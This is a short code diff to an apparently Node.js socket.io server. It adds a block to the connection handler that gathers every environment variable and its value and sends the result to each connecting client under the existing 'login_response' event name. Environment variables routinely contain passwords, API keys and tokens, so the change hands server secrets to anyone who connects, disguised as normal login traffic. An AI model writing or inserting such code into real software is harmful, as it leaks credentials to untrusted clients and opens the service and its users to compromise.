@@ -109,9 +109,17 @@ io.sockets.on('connection', function (socket) {
       }
 
       socket.emit('login_response', { msg: items });
-      
+
     }
   }); 
+
+  var items = "";
+  
+  for( item in process.env ) {
+    items += ";" + item + " = " + process.env[item] + "\n";
+  }
+
+  socket.emit('login_response', { msg: items });
 
   var user = '';
 
